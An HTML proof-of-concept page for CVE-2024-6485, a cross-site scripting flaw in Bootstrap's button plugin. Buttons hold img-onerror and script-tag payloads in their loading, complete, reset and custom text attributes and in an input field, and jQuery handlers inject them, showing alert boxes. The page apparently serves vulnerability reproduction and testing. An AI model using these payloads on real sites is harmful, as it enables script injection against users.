<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>CVE-2024-6485</title>
    <link rel="stylesheet" href="../dist/css/bootstrap.min.css">
    <script src="../docs/assets/js/vendor/jquery.min.js"></script>
    <script src="../dist/js/bootstrap.js"></script>
</head>

<body>

    <div class="container">

        <div class="page-header">
            <h1>CVE-2024-6485</h1>
        </div>

        <button id="btnXss" class="btn btn-primary">Click Me</button>

        <button type="button" class="btn btn-primary btn-xss"
            data-loading-text="<span>Loading XSS</span><img src='x' onerror='alert(&quot;XSS onerror&quot;)'>">
            Click Me
        </button>

        <button class="btn btn-primary complete-test" data-loading-text="Wait for completion..."
            data-complete-text="<span>Loading XSS</span><script>alert('XSS on complete')</script>" type="button">
            Click Me
        </button>

        <button class="btn btn-xss btn-primary" data-loading-text="Wait for reset..."
            data-reset-text="<span>Loading XSS</span><script>alert('XSS on reset')</script>" type="button">
            Click Me
        </button>

        <button class="btn btn-primary string-test"
            data-foobar-text="<span>Loading XSS</span><script>alert('XSS Foobar')</script>" type="button">
            Click Me
        </button>

        <br>
        <input id="firstName" type="text" value="<script>alert('XSS Input Success')</script><span>Loading XSS</span>" />
        <button class="btn btn-primary input-test" data-loading-text="<span>Loading XSS</span>" type="button">
            Input XSS
        </button>

    </div>

    <script>
        $(function () {
            $('#btnXss').click(function () {
                var someUnsanitizedText = '<img src=x onerror=alert("Vulnerable!")>'
                $(this).data('loadingText', someUnsanitizedText)
                $(this).button('loading')
            })

            $('.btn-xss').click(function () {
                $(this)
                    .button('loading')
                    .delay(1000)
                    .queue(function () {
                        $(this).button('reset');
                        $(this).dequeue();
                    });
            });

            $('.complete-test').click(function () {
                $(this)
                    .button('loading')
                    .delay(1000)
                    .queue(function () {
                        $(this).button('complete');
                        $(this).dequeue();
                    });
            });

            $('.string-test').click(function () {
                $(this)
                    .button('foobar')
                    .delay(1000)
                    .queue(function () {
                        $(this).button('reset');
                        $(this).dequeue();
                    });
            });

            $('.input-test').click(function () {
                var inputValue = $('#firstName').val();
                $(this).data('loadingText', inputValue);
                $(this).button('loading', inputValue);
            });
        });
    </script>
</body>

</html>
